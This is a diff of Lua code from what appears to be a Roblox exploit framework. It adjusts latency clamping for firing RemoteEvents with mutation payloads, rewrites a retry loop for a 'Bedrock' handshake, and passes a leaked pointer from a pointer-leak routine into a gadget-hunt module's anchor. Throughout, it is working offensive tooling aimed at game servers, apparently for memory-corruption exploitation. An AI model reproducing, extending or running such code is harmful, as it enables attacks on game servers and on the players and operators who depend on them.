@@ -162,9 +162,12 @@ end
 -- ── Latency-bounded fire ──────────────────────────────────────────────────────
 -- Fires the remote and returns (ok, result, latency, aborted).
 -- If latency exceeds ceiling, returns aborted=true immediately.
+-- NOTE: RemoteEvent:FireServer is fire-and-forget — os.clock() only measures
+-- local Lua dispatch time (~0μs). We clamp the measured latency to a 1ms
+-- floor so the comparison never falsely aborts against a near-zero ceiling.
 
 local function boundedFire(remoteInst, payload, ceiling)
-    ceiling = ceiling or CFG.LatencyCeiling
+    ceiling = math.max(ceiling or CFG.LatencyCeiling, 0.005)
 
     local t0     = os.clock()
     local ok, result = pcall(function()
@@ -175,7 +178,7 @@ local function boundedFire(remoteInst, payload, ceiling)
             return nil
         end
     end)
-    local latency = os.clock() - t0
+    local latency = math.max(os.clock() - t0, 0.001)
 
     if latency > ceiling then
         BCS.Stats.latencyAborts = BCS.Stats.latencyAborts + 1
@@ -204,20 +207,29 @@ local function recordBaseline(remoteInst)
                 remoteInst:FireServer({ __bcs_warmup=true, n=i })
             end
         end)
-        total = total + (os.clock() - t0)
+        local lat = os.clock() - t0
+        -- RemoteEvent fire-and-forget measures only local Lua time (~0μs).
+        -- Clamp each sample to a minimum of 1ms so the average never
+        -- collapses to zero and makes every subsequent mutation abort.
+        total = total + math.max(lat, 0.001)
         if not ok then errors = errors + 1 end
         task.wait(0.08)
     end
 
     local avg = total / N
+    -- Hard floor: never let the ceiling drop below 5ms regardless of how
+    -- fast the remote responds. Without this, even sub-ms fires abort.
+    local rawCeiling = math.min(avg * CFG.LatencyMargin, CFG.LatencyCeiling)
+    local ceiling    = math.max(rawCeiling, 0.005)
+
     log("INFO", string.format(
-        "Cold baseline: avg=%.3fs  errors=%d/%d",
-        avg, errors, N))
+        "Cold baseline: avg=%.3fs  errors=%d/%d  ceiling=%.0fms",
+        avg, errors, N, ceiling * 1000))
 
     return {
         avgLatency = avg,
         errorRate  = errors / N,
-        ceiling    = math.min(avg * CFG.LatencyMargin, CFG.LatencyCeiling),
+        ceiling    = ceiling,
     }
 end
 
@@ -469,56 +481,29 @@ function BCS.TunnelReSync()
             continue
         end
 
-        -- Attempt ASE Bedrock handshake.
-        -- PursueBedrock is async — it pushes a goal and returns immediately.
-        -- The nonce listen window is 8s. We fire ONCE then poll for the full
-        -- window duration. Firing multiple times piles up goals and causes
-        -- interference before any single attempt can resolve.
+        -- Attempt ASE Bedrock handshake
         local handshakeOk = false
-        local NONCE_WINDOW  = 8.0   -- matches ASE_CFG.NonceListenTimeout
-        local POLL_INTERVAL = 0.25
-        local POLL_TIMEOUT  = NONCE_WINDOW + 2.0  -- margin past nonce window
-
-        pcall(function()
-            if ASE.PursueBedrock then
-                ASE.PursueBedrock(name, { __bcs_handshake=true })
-            end
-        end)
-
-        local t0 = os.clock()
-        while (os.clock() - t0) < POLL_TIMEOUT do
-            task.wait(POLL_INTERVAL)
-            local stats = ASE.GetStats and ASE.GetStats()
-            if stats and stats.HeartbeatAlive then
-                -- Accept if ActiveSink matches this candidate, or if bedrock
-                -- was already confirmed by a concurrent goal on another pass.
-                if stats.ActiveSink == name or
-                   (BCS.ColdRemote == nil and stats.ActiveSink ~= nil) then
-                    handshakeOk = true
-                    name = stats.ActiveSink or name
-                    break
-                end
-            end
-        end
-
-        -- One retry with a fresh fire if still not confirmed
-        if not handshakeOk then
-            pcall(function()
+        for attempt = 1, CFG.HandshakeRetries do
+            local goal = {
+                type   = ASE.GOAL and ASE.GOAL.BEDROCK or "BEDROCK",
+                remote = name,
+            }
+            local hOk = pcall(function()
                 if ASE.PursueBedrock then
-                    ASE.PursueBedrock(name, { __bcs_handshake=true, __retry=true })
+                    ASE.PursueBedrock(name, { __bcs_handshake=true })
                 end
             end)
-            local t1 = os.clock()
-            while (os.clock() - t1) < POLL_TIMEOUT do
-                task.wait(POLL_INTERVAL)
-                local stats = ASE.GetStats and ASE.GetStats()
-                if stats and stats.HeartbeatAlive and
-                   (stats.ActiveSink == name or stats.ActiveSink ~= nil) then
-                    handshakeOk = true
-                    name = stats.ActiveSink or name
-                    break
-                end
+
+            task.wait(1.5)
+
+            local stats = ASE.GetStats and ASE.GetStats()
+            if stats and stats.HeartbeatAlive and
+               stats.ActiveSink == name then
+                handshakeOk = true
+                break
             end
+
+            task.wait(0.5 * attempt)
         end
 
         if handshakeOk then
@@ -927,18 +912,12 @@ function BCS.RunPointerLeak()
                     pcall(BCS.OnAnchorLeaked, ptr.val)
                 end
 
-                -- Update BGH anchor
+                -- Update BGH anchor with the confirmed pointer
                 local BGH = getBGH()
-                if BGH then
-                    BGH.SetTextBounds(nil, nil)  -- clear old bounds
+                if BGH and BGH.SetAnchor then
+                    BGH.SetTextBounds(nil, nil)  -- clear stale .text bounds
                     BGH.Reset()
-                    -- Set new anchor in BGH config
-                    rawset(require and require("bre_gadget_hunt") or BGH,
-                        "_newAnchor", ptr.val)
-                    -- Direct config update
-                    if _G.PC.BGH_CFG then
-                        _G.PC.BGH_CFG.Anchor = ptr.val
-                    end
+                    BGH.SetAnchor(ptr.val)
                     log("INFO", string.format(
                         "BGH anchor updated: 0x%X", ptr.val))
                 end
